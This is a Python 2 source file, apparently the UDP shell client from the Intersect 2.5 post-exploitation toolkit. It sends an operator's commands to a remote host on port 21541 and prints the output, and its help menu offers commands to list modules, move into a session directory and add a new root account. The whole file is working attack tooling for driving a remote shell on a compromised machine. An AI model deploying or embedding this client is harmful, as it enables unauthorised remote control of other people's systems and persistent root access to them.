#!/usr/bin/python

# Intersect 2.5
# UDP Shell Client
# https://github.com/ohdae/Intersect-2.0

import os, sys
import socket

try:
    host = sys.argv[1]
except IndexError:
    print("Intersect 2.5 - UDP Shell Client.")
    print("Usage: ./UDP-Client.py serverIP")
    print("[!] You must specify a host IP address!")
    sys.exit()

port = 21541
buf = 1024
addr = (host,port)

# Create socket
UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("UDP Interactive Shell.\nEnter ':help' for a list of extra available commands.")

while 1:
    cmd = raw_input("Intersect => ")
    (UDPSock.sendto(cmd,addr))

    if cmd == ":killme":
        (UDPSock.sendto(":killme",addr))
        print("[!] Closing shell connection!")
        sys.exit(0)

    elif cmd == ":help":
        print("Available Commands:\n")
        print(":help         |  this menu")
        print(":mods         |  list loaded modules")
        print(":temp         |  go to Intersect session directory")
        print(":addroot name |  add new root account with 'name'")
        print(":exec module  |  executes Intersect 'module'")
        print(":killme       |  closes shell connection")

    elif cmd.startswith(":exec"):
        print("[!] Command not fully implemented yet. Sorry!")

    else:
        data,addr = UDPSock.recvfrom(buf)
        print data

UDPSock.close()
